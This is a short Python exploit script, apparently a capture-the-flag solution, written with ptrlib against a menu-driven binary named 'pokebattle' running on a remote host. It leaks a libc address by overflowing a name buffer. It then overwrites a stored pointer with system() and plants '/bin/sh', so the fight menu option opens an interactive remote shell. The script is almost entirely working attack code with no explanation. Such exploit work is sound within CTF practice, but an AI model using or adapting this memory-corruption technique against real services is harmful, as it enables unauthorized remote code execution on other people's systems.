from ptrlib import *

def fight():
    sock.sendlineafter("> ", "1")
    return
def catch(index, name):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(":", str(index))
    sock.sendafter(" : \n", name)
    return
def list(index):
    sock.sendlineafter("> ", "4")
    sock.recvline()
    dataList = []
    for i in range(10):
        w = sock.recvline()
        name, hp = w.split(b' . ')[1].split(b' /HP[')
        hp = int(hp[:-1])
        dataList.append((name, hp))
    sock.sendlineafter(":", str(index))
    return dataList

libc = ELF("./libc.so.6")
elf = ELF("./pokebattle")
#sock = Process("./pokebattle")
sock = Socket("114.177.250.4", 2225)
libc_ofs = 0x1b3787

"""
# leak proc
catch(0, "A" * 0x28)
proc_base = u64(list(0)[0][0][0x28:]) - 0x92a
logger.info("proc = " + hex(proc_base))
"""

# leak libc
catch(0, "A" * 0x38)
libc_base = u64(list(0)[0][0][0x38:]) - libc_ofs
logger.info("libc = " + hex(libc_base))

# get the shell!
payload = b'/bin/sh'
payload += b'\x00' * (0x28 - len(payload))
payload += p64(libc_base + libc.symbol('system'))
catch(0, payload)
fight()

sock.interactive()

